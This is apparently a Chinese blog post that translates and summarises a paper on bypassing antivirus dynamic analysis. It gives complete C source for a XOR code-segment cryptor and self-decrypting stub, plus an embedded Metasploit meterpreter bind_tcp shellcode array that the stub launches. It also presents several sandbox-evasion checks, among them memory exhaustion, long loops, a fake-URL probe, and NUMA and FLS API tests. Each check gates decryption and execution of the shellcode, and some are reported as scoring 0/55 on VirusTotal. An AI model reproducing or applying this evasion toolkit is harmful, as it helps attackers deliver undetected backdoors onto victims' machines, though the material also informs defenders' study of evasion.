---
title: BypassAVDynamics[译]
date: 2022-07-02
tags: 免杀
categories: Technology
---

本文译的是《BypassAVDynamics》，也不能算译文，主要写自己读完之后学到的东西

好久之前的文章了，vt应该查杀挺多的，没测试

need read：

>   [PE注入](https://blog.sevagas.com/?PE-injection-explained)
>
>   这个应该写过，win32那里...

[toc]



# 简介

绕过AV的两大步骤：

-   恶意代码的隐藏，通常使用加密完成
-   对解密存根进行编码，使其不会被检测为病毒，也不会被病毒绕过沙箱

本文主要是第二种，欺骗绕过沙箱。

# 免杀原理

## 静态分析

静态分析基于黑名单的方法，当AV分析师得到一个恶意样本，会提取一个签名，或者说特征码，特征码是基于特殊的代码和数据。特征码通常是使用可执行文件的第一个执行字节来构造的。

AV拥有包含数百万个签名的数据库，并将扫描后的代码与该数据库进行匹配比较。

第一代AV使用上述方法，现在仍在使用，同时结合了启发式与动态分析。

YARA这款工具可以用于创建规则来分类和识别恶意软件。这些规则被上传到AV和逆向工具中。YARA 可以在 [http://plusvic.github.io/yara/](https://www.77169.net/go?url=http://plusvic.github.io/yara/)找到。

基于这种的分析方法不能够检测新的恶意软件。所以想要绕过基于特征码的分析，可以构建一个新的代码或者做一些小的修改，

## 静态启发式分析

在这种情况下，AV 将检查代码中已知存在于恶意软件中的模式。 有很多可能的规则，这取决于供应商。 这些规则通常没有描述（我想避免它们太容易被绕过）所以并不总是容易理解为什么 AV 认为软件是恶意的。 启发式分析的主要资产是它可以用来检测新的不在签名数据库中的恶意软件。 主要缺点是它会产生误报。

一个例子:函数[CallNextHookEx](https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-callnexthookex?redirectedfrom=MSDN)一般被用户态的键盘记录器使用。一些杀软认为这个函数的用法是一个威胁，如果这个函数的名字在可执行文件中被检测到，将发出一个关于这个软件启发式的警告。

一个例子：一段代码打开“explorer.exe”进程，尝试写一些代码到其虚拟内存空间，这也被考虑为恶意的行为。

最容易的绕过启发式分析的方法是，确保所有的恶意代码是隐藏的。对于这个，编写解密的代码是最常用的方法。如果在解密之前，没有触发警告，如果这个解密Stub在解密完没有产生一些一般被认为恶意的行为，那么这个恶意软件不会被检测出来。

https://blog.sevagas.com/?Code-segment-encryption

https://blog.sevagas.com/Hide-meterpreter-shellcode-in-executable

## 动态分析

如今大部分AV都是用动态的方法，当一个可执行文件被扫描，他将会在虚拟的环境中运行一小段时间。将此与签名验证和启发式分析相结合，可以检测未知恶意软件，即使是那些依赖加密的恶意软件。实际上，代码是在 AV 沙箱中自行解密的； 然后，对“新代码”的分析可能会引发一些可疑行为。如果使用加密/解密stub来隐藏恶意软件，倘若他们跳过解密阶段，大部分的AV会检测到它。

也就意味着，绕过动态分析依赖两个方面：

-   具有不可检测的自解密机制（如启发式机制）
-   阻止AV执行解密stub

## 杀软的局限性

三个主要的局限性：

-   扫描必须快
-   环境是模拟的，因此不知道机器和恶意软件环境的特殊性
-   仿真/沙盒系统有一些可以被恶意软件检测出来的差异性

# 代码段加密

## 介绍

>   https://blog.sevagas.com/?Code-segment-encryption



## 原理

PE的经典构成：

```
======================
	PE Headers
======================
	.textbss segment
======================
	.text segment
======================
	.rdata segment
======================
	.data segment
======================
	.rsrc segment
======================
```

-   .textbss：为空，用于在虚拟内存中为未初始化的全局变量预留空间

-   .text：可执行代码
-   .rdata：包含只读数据它用于全局常量（包括字符串）。eg：`printf("hello");`"hello" 中进入**.rdata**。
-   .data：已初始化的非常量全局变量，全局变量`char var[] =  "var";`不是一个常量字符串，它是一个数组并且在 .data 中。

-   .rsrc：资源文件

运行起来后（差异并不大）：

```
======================
	Environment variables
======================
	Stack
----------------------------------------
	Heap
======================
	.textbss segment
======================
	.text segment
======================
	.rdata segment
======================
	.data segment
======================
	.rsrc segment
======================
```

下面：修改一个应用程序（目标），使另一个应用程序可以加密它的一个段。我们还希望目标应用程序在运行时自行解密。

-   .code段将被加密
-   .stub用于解密.code段

### 工具

dumpbin，使用这个可以查看pe的东西

## 调整目标软件

### 创建.code段

创建新段使用：`#pragma section`

创建code段

在示例中，希望将可执行代码放入.code段中

```c
/* Your system includes */
#include <windows.h>
 
/* Declare .code as a read/write/execute segment */
#pragma section(".code",execute, read, write)
#pragma comment(linker,"/SECTION:.code,ERW")
 
/* .code 段开始（下面所有生成的可执行代码都将进入 .code 段）*/
#pragma code_seg(".code")
```

### 创建解密stub

为什么我们需要一个 .stub 段，因为我们不加密所有代码？好吧，我们需要加密器能够修补目标自解密例程，并且我们想要修补的代码将更容易在 .stub 部分中找到。本文的变体也可用于将所有段合并为一个（.code）。所以有 .stub 部分更通用。

```c
 
// .stub SECTION
#pragma section(".stub", execute, read, write)
#pragma code_seg(".stub")
 
#define CODE_BASE_ADDRESS	0x15151515 // 指向原始数据的dumpbin文件指针 (do not change, this will be patched by cryptor)
#define CODE_SIZE			0x14141414 // 虚拟内存的dumpbin大小 (do not change, this will be patched by cryptor)
 
/* Decrypt .code block encrypted by cryptor */
/* In this function do not declare array to avoid security cookies checks (see http://msdn.microsoft.com/en-us/library/8dbf701c.aspx) */
/* Or disable security check (GS- option) on prog compilation */
void decryptCodeSection()
{
	unsigned char *ptr;
	long int i;
	long int nbytes;
	int cpt = 0;
	BYTE  key[] = { '1','2','3','4','5','6','7','8','\0'};/* 注意：如果您打算加密 .rdata 段，请避免使用字符串 */
	int keyLength = 8;
	ptr = (unsigned char *)CODE_BASE_ADDRESS;/* 这将由cryptor修补*/
	nbytes = CODE_SIZE;/* 这将由cryptor修补*/
 
	// decrypt code segment    
    for( i = 0 ; i < nbytes ; i++ )
    {
		ptr[i]=ptr[i]^key[cpt];
		cpt = cpt + 1;
		if(cpt == keyLength)
			cpt = 0;
    }
	return;
}
 
/* Program first entry function */
int main()
{
	decryptCodeSection();
	realmain(); /* Call decrypted program entry point */
	return 0;
}
```

### 编译链接选项

因为目标会自我修改自己，所以我们必须避免使用安全 cookie（用于堆栈验证）。为此，我们需要删除安全检查。因此，下一个编译选项是强制性的：

```
/GS-  -> Disable functions stack verification relying on secure cookies
```

另一个选项几乎是强制性的，静态包含运行时库。如果目标中未包含 Microsoft 运行时库，则此代码将起作用，但您将面临可移植性问题。
使用接下来的两个运行时库选项之一。

```c
/MTD -> for debug
/MT  -> for release
```

为了避免复杂化，我们希望修复地址并删除数据执行预防。为此，我们必须使用链接器的下一个选项。

```
/DYNAMICBASE:NO
/FIXED
/NXCOMPAT:NO
```

## 构建加密器

### 获取需要的信息

加密器的作用是加密目标程序的 .code 段以及修补 .stub 段，以便目标在启动时能够自解密。
为此，密码器将浏览上一节中生成的二进制文件，并找到 .code 和 .stub 段的地址和大小。我们需要文件偏移量（修改二进制目标）和虚拟内存地址（向目标程序指示他应该在运行时解密的段在哪里）。

首先，需要使用 CreateFileMapping 和 MapViewOfFile 将文件映射到内存中。我没有对此代码进行任何功能修改。它可以在书中或在互联网上找到。
完成此操作后，我们解析映射文件以获取节标题信息。

```c
/**
 * Get information of .code and .stub segments
 */
void getSegmentsInfo(LPVOID baseAddress, SEGMENT_INFO_PTR codeSegmentInfo, SEGMENT_INFO_PTR stubSegmentInfo)
{
    PIMAGE_DOS_HEADER dosHeader;
    PIMAGE_NT_HEADERS peHeader;
    IMAGE_OPTIONAL_HEADER32 optionalHeader;

    dosHeader = (PIMAGE_DOS_HEADER)baseAddress;
    if (((*dosHeader).e_magic) != IMAGE_DOS_SIGNATURE)
    {
        printf("getSegmentsInfo: Dos signature not matched\n");
        return;
    }
    printf("getSegmentsInfo: Dos signature=%X\n", (*dosHeader).e_magic);

    peHeader = (PIMAGE_NT_HEADERS)((DWORD)baseAddress + (*dosHeader).e_lfanew);
    if (((*peHeader).Signature) != IMAGE_NT_SIGNATURE)
    {
        printf("getSegmentsInfo: PE signature not matched\n");
        return;
    }
    printf("getSegmentsInfo: PE signature=%X\n", (*peHeader).Signature);

    optionalHeader = (*peHeader).OptionalHeader;
    if ((optionalHeader.Magic) != 0x10B)
    {
        printf("getSegmentsInfo: Optional header magic number does not match\n");
        return;
    }
    printf("getSegmentsInfo: OPtional header magic nb=%X\n", optionalHeader.Magic);

    (*codeSegmentInfo).moduleBase = optionalHeader.ImageBase;
    (*stubSegmentInfo).moduleBase = optionalHeader.ImageBase;

    printf("getSegmentsInfo: # sections=%d\n", (*peHeader).FileHeader.NumberOfSections);

    /* Fill code information with content of code segment */
    TraverseSectionHeaders(IMAGE_FIRST_SECTION(peHeader), (*peHeader).FileHeader.NumberOfSections, codeSegmentInfo, ".code");
    TraverseSectionHeaders(IMAGE_FIRST_SECTION(peHeader), (*peHeader).FileHeader.NumberOfSections, stubSegmentInfo, ".stub");

    return;
}
```

下一个函数用于获取任何部分的下一个信息：

-   原始文件中的段偏移量
-   文件段大小
-   段的虚拟内存偏移量

```c
/**
 * Look for sectionName segment in mapped file
 * addrInfo will be filled with the segment information
 */
void TraverseSectionHeaders(
    PIMAGE_SECTION_HEADER section,
    DWORD nSections,
    SEGMENT_INFO_PTR addrInfo,
    char *sectionName)
{
    DWORD i;
    /* Copy pointer to initial section (so this function can be called several times) */
    PIMAGE_SECTION_HEADER localSection = section;
    printf("\n\nTraverseSectionHeaders: searching for segment in section headers\n");
    for (i = 0; i < nSections; i++)
    {
        printf("     ====================     \n");
        printf("\tName:			%s\n", (*section).Name);
        if (strcmp((*section).Name, sectionName) == 0)
        {
            (*addrInfo).fileSegmentOffset = (*section).PointerToRawData; /* Location of segment in binary file*/
            (*addrInfo).fileSegmentSize = (*section).SizeOfRawData;      /* Size of segment */
            (*addrInfo).memorySegmentOffset = (*section).VirtualAddress; /* Offset of segment in memory at runtime */
        }
        section = section + 1;
    }
    return;
}
```

## 加密目标段

现在我们有了二进制文件中 .code 段的大小和位置，我们可以打开文件并加密想要的字节。
该代码并未真正优化，但对于调试目的非常实用。在这个函数中，我们：

-   打开二进制目标文件
-   寻找 .code 段
-   在缓冲区中加载 .code 段
-   加密缓冲区
-   写入加密缓冲区代替明文 .code 段
-   关闭文件并离开

```c
/**
 * Encrypt .code segment bytes in the given file 
 */
void cipherBytes(char* fileName, SEGMENT_INFO_PTR addrInfo)
{
	DWORD fileOffset;
	DWORD nbytes;
 
	FILE* fptr;
	BYTE *buffer;
	DWORD nItems;
	DWORD i;
	BYTE  key[] = "ab345izz";
	int keyLength = 8;
	int cpt = 0;
 
	fileOffset = addrInfo->fileSegmentOffset;
	nbytes = addrInfo->fileSegmentSize;
	/* Allocate memory in buffer that will store content of segment */
	buffer = (BYTE*)malloc(nbytes);
	if(buffer == NULL)
	{
		printf("cipherBytes: malloc error \n");
		return;
	} 
 
	/* Open binary file */
	fptr = fopen(fileName,"r+b");
	if(fptr == NULL)
	{
		printf("cipherBytes: fopen error \n");
		return;
	}
	/* Seek .code section using calculated offset and copy content into buffer*/
	if(fseek(fptr, fileOffset, SEEK_SET)!=0)
	{
		printf("cipherBytes: Unable to set file pointer to %ld \n", fileOffset);
		fclose(fptr);
		return;
	}
	nItems = fread(buffer, sizeof(BYTE), nbytes, fptr);
	if(nItems  <nbytes)
	{
		printf("cipherBytes: Trouble reading nItems = %d \n",nItems);
		fclose(fptr);
		return;
	}
 
	/* Encrypt buffer */
    for( i = 0 ; i < nbytes ; i++ )
    {
		buffer[i]=buffer[i]^key[cpt];
		cpt = cpt + 1;
		if(cpt == keyLength)
			cpt = 0;
    }
 
	/* Replace current .code section in file by encrypted one */
	if(fseek(fptr, fileOffset, SEEK_SET)!=0)
	{
		printf("cipherBytes: Unable to set file pointer to %ld \n", fileOffset);
		fclose(fptr);
		return;
	}
	nItems = fwrite(buffer, sizeof(BYTE), nbytes, fptr);
	if(nItems  <nbytes)
	{
		printf("cipherBytes: Trouble writing nItems = %d \n",nItems);
		fclose(fptr);
		return;
	}
 
	printf("Successfully ciphered %d bytes\n",nbytes);
	fclose(fptr);
	return;
}
```

### 补丁.stub部分

加密 .code 部分后，我们需要修补 .stub 部分，以便目标可以自行解密。在这个函数中，我们：

-   打开二进制目标文件
-   寻找 .stub 段
-   在缓冲区中加载 .stub 段
-   找到 CODE_BASE_ADDRESS 和 CODE_SIZE
-   用虚拟内存偏移量和 .code 部分的大小替换值
-   写补丁缓冲区代替 .stub 段
-   关闭文件并离开

```c
/**
 * Patch the filepath file (the .stub segment)
 * Here we replace CODE_BASE_ADDRESS and CODE_SIZE by newBaseAddr and newSegSize
 * newBaseAddr is the Virtual memory base address of .code segment in target file
 * newSegSize contains the size of the target file .code segment
 */
void patchStub(char * filepath,  SEGMENT_INFO_PTR addrInfo, DWORD newBaseAddr, DWORD newSegSize )
{
	DWORD fileOffset;
	DWORD nbytes;
	DWORD nItems;
	/* Signature to locate where segment memory base address should be written */
	BYTE baseAddrSignature[] = { 0x15, 0x15, 0x15, 0x15, 0x00 }; 
	/* Signature to locate where segment size should be written*/
	BYTE segSizeSignature[] = { 0x14, 0x14, 0x14, 0x14, 0x00 }; 
	BYTE * baseAddrAddress = NULL;
	BYTE * segSizeAddress = NULL;
	BYTE *buffer;
	FILE* fptr;
	fileOffset = addrInfo->fileSegmentOffset;
	nbytes = addrInfo->fileSegmentSize;
 
	/* Allocate memory in buffer that will store content of segment */
	buffer = (BYTE*)malloc(nbytes);
	if(buffer == NULL)
	{
		printf("patchStub: malloc error \n");
		return;
	}
 
	/* Open binary file */
    fptr = fopen(filepath, "r+b");
	if(fptr == NULL)
	{
		printf("patchStub: fopen error \n");
		return;
	}
 
	/* Seek .stub section using calculated offset*/
	if(fseek(fptr, addrInfo->fileSegmentOffset, SEEK_SET)!=0)
	{
		printf("patchStub: Unable to set file pointer to %ld \n", addrInfo->fileSegmentOffset);
		fclose(fptr);
		return;
	}
	/* Copy content of stub segment into buffer */
	nItems = fread(buffer, sizeof(BYTE), nbytes, fptr);
	if(nItems  <nbytes)
	{
		printf("patchStub: Trouble reading nItems = %d \n",nItems);
		fclose(fptr);
		return;
	}
 
	/* Search the baseAddress in buffer section */
	baseAddrAddress = binStrstr(buffer,baseAddrSignature);
	/* Change base Address by calculated value */
	memcpy(baseAddrAddress,&newBaseAddr,sizeof(newBaseAddr));
 
	/* Search the baseAddress in buffer section */
	segSizeAddress = binStrstr(buffer,segSizeSignature);
	/* Change base Address by calculated value */
	memcpy(segSizeAddress,&newSegSize,sizeof(newSegSize));
 
    /* Replace current .stub section in file by patched one */
	if(fseek(fptr, fileOffset, SEEK_SET)!=0)
	{
		printf("patchStub: Unable to set file pointer to %ld \n", fileOffset);
		fclose(fptr);
		return;
	}
	nItems = fwrite(buffer, sizeof(BYTE), nbytes, fptr);
	if(nItems  <nbytes)
	{
		printf("patchStub: Trouble writing nItems = %d \n",nItems);
		fclose(fptr);
		return;
	}
    printf("Successfully patched file\n");
	fclose(fptr);
 
    return ;
}
```

### main部分

```c
/** 
 * Cryptor entry point 
 */
void main(int argc, char *argv[])
{
	char *fileName;
	HANDLE hFile;
	HANDLE hFileMapping;
	LPVOID fileBaseAddress;
	BOOL retVal;
	/* To store information of .code and .stub segments */
	SEGMENT_INFO codeSegmentInfo;
	SEGMENT_INFO stubSegmentInfo;
 
	if(argc <2)
	{
		printf("main: Not enough arguments");
		return;
	}
	fileName = argv[1];
	/* Map target file */
	retVal = getHMODULE(fileName, &hFile, &hFileMapping, &fileBaseAddress);
	if(retVal==FALSE)
	{
		return;
	}
 
	/* Init structures */
	codeSegmentInfo.moduleBase = (DWORD)NULL;
	codeSegmentInfo.memorySegmentOffset = (DWORD)NULL;
	codeSegmentInfo.fileSegmentOffset = (DWORD)NULL;
	codeSegmentInfo.fileSegmentSize = (DWORD)NULL;
	stubSegmentInfo.moduleBase = (DWORD)NULL;
	stubSegmentInfo.memorySegmentOffset = (DWORD)NULL;
	stubSegmentInfo.fileSegmentOffset = (DWORD)NULL;
	stubSegmentInfo.fileSegmentSize = (DWORD)NULL;
 
	/* Fill segments information */
	getSegmentsInfo(fileBaseAddress,&codeSegmentInfo,&stubSegmentInfo);
 
	printf("\n\n=======================\n");
	printf(".code segment information: \n");
	printf("RAM image base		=0x%08X\n",codeSegmentInfo.moduleBase);
	printf("RAM segment offset	=0x%08X\n",codeSegmentInfo.memorySegmentOffset);
	printf("File offset of code =0x%08X\n",codeSegmentInfo.fileSegmentOffset);
	printf("File size of code	=0x%08X\n",codeSegmentInfo.fileSegmentSize);
	printf("\n\n=======================\n");
	printf(".stub segment information: \n");
	printf("RAM image base		=0x%08X\n",stubSegmentInfo.moduleBase);
	printf("RAM segment offset	=0x%08X\n",stubSegmentInfo.memorySegmentOffset);
	printf("File offset of code =0x%08X\n",stubSegmentInfo.fileSegmentOffset);
	printf("File size of code	=0x%08X\n",stubSegmentInfo.fileSegmentSize);
	closeHandles(hFile, hFileMapping,fileBaseAddress);
	cipherBytes(fileName,&codeSegmentInfo);
 
	patchStub(fileName,&stubSegmentInfo,codeSegmentInfo.moduleBase+codeSegmentInfo.memorySegmentOffset,codeSegmentInfo.fileSegmentSize);
 
	return;
}
```







# 测试

## VirusTotal

VirusTotal（[https://www.virustotal.com](https://www.77169.net/go?url=https://www.virustotal.com)）是针对多个AV的在线扫描的参考平台。

>   众所周知，如果你想要一个未被检测到的恶意软件来保留FUD特性，你应该永远不会发送到VirusTotal

FUD(Fully undetectable),完全不被检测

## 加密的恶意软件



这里的完整代码：https://blog.sevagas.com/Hide-meterpreter-shellcode-in-executable



```c
 
#include <Windows.h>
 
/* Declare new sections to store encrypted code and shellcode data */
#pragma section(".code",execute, read, write)
#pragma section(".codedata", read, write)
// Merge  .codedata into .code (which will be encrypted by cryptor)
#pragma comment(linker,"/MERGE:.codedata=.code")
// Declare .code as Executable, Read, Write section, this is necessary so application rewrites itself
#pragma comment(linker,"/SECTION:.code,ERW")
 
// This will put all following constants and global variables in .codedata segment
// 这会将所有以下常量和全局变量放在 .codedata 段中
#pragma data_seg(".codedata")
#pragma const_seg(".codedata")
// From here executable code will go in .code section
#pragma code_seg(".code")
 
/*
 * windows/meterpreter/bind_tcp - 298 bytes (stage 1)
 * http://www.metasploit.com
 * VERBOSE=false, LPORT=80, RHOST=, EnableStageEncoding=false, 
 * PrependMigrate=false, EXITFUNC=process, AutoLoadStdapi=true, 
 * InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true, 
 * EnableUnicodeEncoding=true
 */
unsigned char buf[] = 
"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68"
"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
"\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
"\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x31"
"\xdb\x53\x68\x02\x00\x00\x50\x89\xe6\x6a\x10\x56\x57\x68\xc2"
"\xdb\x37\x67\xff\xd5\x53\x57\x68\xb7\xe9\x38\xff\xff\xd5\x53"
"\x53\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x97\x68\x75\x6e\x4d"
"\x61\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
"\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58"
"\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
"\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3";
 
 
/* Launch the meterpreter shellcode */
int shellLaunch()
 {
    /* Declare pointer on function */
    int (*func) ();
 
    /* Cast shellcode into function */
    func = (int (*) ()) buf;
 
    /* Call function (Execute shellcode) */
    (int) (*func) ();
}
 
 
// .stub SECTION , the following part is not encrypted.
#pragma section(".stub", execute, read, write)
#pragma code_seg(".stub")
#pragma section(".stubdata", read, write)
// Merge  .stubdata into .stub (decryption part)
#pragma comment(linker,"/MERGE:.stubdata=.stub")
 
// This will put out strings and global variables in .stubdata segment
#pragma data_seg(".stubdata")
#pragma const_seg(".stubdata")
// Executable code will go in .stub section
#pragma code_seg(".stub")
 
 
// Next data are signature recognized by cryptor to patch the target
// 下一个数据是加密器识别的签名以修补目标
#define CODE_BASE_ADDRESS	0x15151515 
#define CODE_SIZE			0x14141414 
 
/* Decrypt .code block encrypted by cryptor */
/* In this function do not declare array to avoid security cookies checks (see http://msdn.microsoft.com/en-us/library/8dbf701c.aspx) */
/* Or disable security check (GS- option) on prog compilation */
void decryptCodeSection()
{
	unsigned char *ptr;
	long int i;
	long int nbytes;
	DWORD patience;
	DWORD codeAddr;
 
	int cpt = 0;
 
	BYTE  key[] = { 'a','b','a','b','a','b','a','b','\0'};
	int keyLength = 8;
	ptr = (unsigned char *)CODE_BASE_ADDRESS;
	nbytes = CODE_SIZE;
 
	// Decrypt code segment    
        for( i = 0 ; i < nbytes ; i++ )
        {
		ptr[i]=ptr[i]^key[cpt];
		cpt = cpt + 1;
		if(cpt == keyLength)
			cpt = 0;
         }
	return;
}
 
int main()
{
	decryptCodeSection();
	shellLaunch(); /* Call function which executes shellcode now that it is decrypted */
	return 0;
}
 
```



# 复杂的方法



## 代码注入方法

代码注入指在另一个进程内运行代码。这个一般通过DLL注入来实现，但也有其他可能存在的方法，甚至可能直接注入完整的exe： https://blog.sevagas.com/?PE-injection-explained

虽然代码注入是一个恶意软件隐形的好办法，大量其中的代码也是可能通过启发式分析识别的

这就是为什么代码注入一般不用于绕过AV，而是使用后用来隐藏和获取特权（例如注入进浏览器的代码和浏览器一样有相同的访问防火墙的权限。

## RunPE方法

这个方法是通过替换掉进程空间的代码从而在目标进程中运行我们想要运行的代码，和代码注入不同的是，在代码注入中你是在远程进程开辟的空间中执行代码；但是在RunPE这个技术中，你使用你想要执行的代码替换掉了远程进程的代码。

一个小例子：

恶意代码被加壳或者加密了，被插入到一个专门加载它的二进制代码中。当加载器执行，它将执行：

-   使用CreateProcess打开一个合法的系统进程（例如：cmd.exe或者calc.exe）。
-   取消映射（Unmap）进程（使用NtUnmapViewOfSection）
-   使用恶意代码替换掉这个进程（使用WriteProcessMemory）

当进程被DEP(数据执行保护)保护的时候，替换一个进程的内存不是很有可能的。

正如代码注入的方法一样，但是因为这篇文章的主题不是这方面的，所以没有给充分的代码。

# 简单有效的方法

## Offer you have to refuse 方法

AV扫描器主要的限制是需要在每个文件上花费大量的时间。在一个常规的系统扫描中，AV必须要分析成百上千的文件。它不能够花费过多的时间和力量在个别的文件上（这就可以在AV上导致一个拒绝服务攻击）。最简单绕过AV的方法是仅仅在代码解密之前，消耗掉AV足够的时间。一个简单的Sleep不能够实现这个技巧，AV模拟器已经适应了这个。无论如何有大量的方法可以实现取得时间。这个被叫做“Offer you have to refuse ”，因为它强行让AV去检查一些代码，这个会消耗掉AV大量的资源，因此我们确信在解密代码被执行之前AV会放弃这个检查。

### 例子1：分配填充100M内存

在下面的代码中，大部分的AV会在malloc的过程中仅仅停止，关于分配指针的条件验证甚至没有必要。

```c
#define TOO_MUCH_MEM 100000000
int main()
{
    char *memdmp = NULL;
    memdmp = (char *)malloc(TOO_MUCH_MEM);
    if (memdmp != NULL)
    {
        memset(memdmp, 00, TOO_MUCH_MEM);
        free(memdmp);
        decryptCodeSection();
        startShellCode();
    }
    return 0;
}
```

当时的VT：0/55

### 例子2：成百上千的递增

使用for循环去每次递增1，达到100万次。这个足以绕过杀软，而且对于现代CPU是可行的。一个人在运行这段代码不会检测到任何的异常。

```c
#define MAX_OP 100000000
int main()
{
    int cpt = 0;
    int i = 0;
    for (i = 0; i < MAX_OP; i++)
    {
        cpt++;
    }
    if (cpt == MAX_OP)
    {
        decryptCodeSection();
        startShellCode();
    }
    return 0;
}
```



## The “I shouldn’t be able to do that!” method

由于在一个仿真的系统里被推出，或许会有一些错误发生，代码或许在正常权限下不会运行。一般来说，在所有权限下，代码都将运行。这个能够被用来猜出这个代码是否在被分析。



### 例子1：打开系统进程

代码会尝试打开一般是拥有所有权限的4号系统进程。如果这个代码没有运行在系统MIC和ring0下，这个将会失败（OpenProcess会返回 00 ）。在这个VirusTotal中，你会看到这个不是FUD方法，而是绕过一些对这个特殊问题脆弱的杀软。

```c
int main()
{
    HANDLE file;
    HANDLE proc;
    proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 4);
    if (proc == NULL)
    {
        decryptCodeSection();
        startShellCode();
    }
    return 0;
}
```



### 尝试打开一个不存在的URL

一种通常用来让代码自我意识到沙箱的方法是在互联网上下载一个特定的文件，并将其哈希与代码知道的哈希进行比较。

为什么这个有效呢？这是因为沙箱环境不给潜在的恶意代码访问互联网的权限。当一个被沙箱分析的文件访问互联网，沙箱只会发送其自身成的文件。因此代码可以通过比较这个文件和其所期望的文件进来判断是否处于沙箱之中。

这个方法有一点问题，首先，如果你没有互联网的访问权限这个就没有效。其次，如果[下载](https://www.77169.net/downloads)的文件改变或者被移除了，代码也不会有效。

另一个没有这些问题的方法是做这个相反的！尝试访问不存在的web域。在真实的世界里，这个会失败。在AV中，因为AV会使用其模拟的页面，这个方法是有效的。

```c
#include <Wininet.h>
#pragma comment(lib, "Wininet.lib")
int main()
{
    char cononstart[] = "http://www.notdetectedmaliciouscode.com//"; // Invalid URL
    char readbuf[1024];
    HINTERNET httpopen, openurl;
    DWORD read;
    httpopen = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    openurl = InternetOpenUrl(httpopen, cononstart, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET _FLAG_NO_CACHE_WRITE, NULL);
    if (!openurl) // Access failed, we are not in AV
    {
        InternetCloseHandle(httpopen);
        InternetCloseHandle(openurl);
        decryptCodeSection();
        startShellCode();
    }
    else // Access successful, we are in AV and redirected to a custom webpage
    {
        InternetCloseHandle(httpopen);
        InternetCloseHandle(openurl);
    }
}
```



## The “Knowing your enemy” method

如果某些人知道了一些目标机器上的一些信息，绕过杀软会变得相当的容易。把代码解密机制链接到你知道目标计算机上的一些信息（或者工作组）。

### 例子1：依赖于本地用户名的操作

如果系统上某人的用户名已知，则可以根据该用户名请求操作。例如，我们可以尝试在用户帐户文件中写入和读取这些文件。在下面的代码中，我们在用户桌面上创建一个文件，我们在其中编写一些字符，然后只有打开文件并读取字符，我们才能启动解密方案。

```c
#define FILE_PATH "C:\\Users\\bob\\Desktop\\tmp.file"
int main()
{
    HANDLE file;
    DWORD tmp;
    LPCVOID buff = "1234";
    char outputbuff[5] = {0};
    file = CreateFile(FILE_PATH, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                      FILE_ATTRIBUTE_NORMAL, 0);
    if (WriteFile(file, buff, strlen((const char *)buff), &tmp, NULL))
    {
        CloseHandle(file);
        file = CreateFile(FILE_PATH,
                          GENERIC_READ,
                          FILE_SHARE_READ,
                          NULL,
                          OPEN_EXISTING, // existing file only
                          FILE_ATTRIBUTE_NORMAL,
                          NULL);
        if (ReadFile(file, outputbuff, 4, &tmp, NULL))
        {
            if (strncmp(buff, outputbuff, 4) == 0)
            {
                decryptCodeSection();
                startShellCode();
            }
        }
        CloseHandle(file);
    }
    DeleteFile(FILE_PATH);
    return 0;
}
```



## The “WTF is that?” method

这节是关于win api的东西

### 例子1：What the fuck is NUMA?

NUMA代表Non Uniform Memory Access（非一致内存访问）。它是一个在多系统中配置内存管理的方法。它链接到在 Kernel32.dll 中声明的一整套函数

更多信息：https://docs.microsoft.com/zh-cn/windows/win32/procthread/numa-support?redirectedfrom=MSDN

下面的代码在物理环境中有效，av环境中失效

```c
int main(void)
{
    LPVOID mem = NULL;
    mem = VirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
    if (mem != NULL)
    {
        decryptCodeSection();
        startShellCode();
    }
    return 0;
}
```



### 例子2：What the fuck are FLS?

FLS是Fiber Local Storage(纤程本地存储），被用来操纵与纤程相关的数据。纤程是一整套运行在线程里的可执行组件。参考这里：https://docs.microsoft.com/zh-cn/windows/win32/procthread/fibers?redirectedfrom=MSDN

在一些av环境中，对于FlsAlloc函数总是返回FLS_OUT_OF_INDEXES

```c
int main(void)
{
    DWORD result = FlsAlloc(NULL);
    if (result != FLS_OUT_OF_INDEXES)
    {
        decryptCodeSection();
        startShellCode();
    }
    return 0;
}
```



## The “Checking the environment” method

如果AV依赖于一个沙盒/仿真环境，一般其环境与真实的环境是不一样的。有大量的方法做这种检查。下面描述了其中两种方法：



### 例子1：检查进程内存

使用Sysinternals工具，当一个AV扫描一个进程的时候，会改变它的内存。AV会为进程开辟内存，仿真的代码进程API也会返回与我们预期不同的值。在这种情况下，我在当前进程使用GetProcessMemoryInfo。如果当前工作设置大于3500000 bytes，我认为这个代码运行在一个AV环境中，如果不是，那么这个代码就解密并运行。

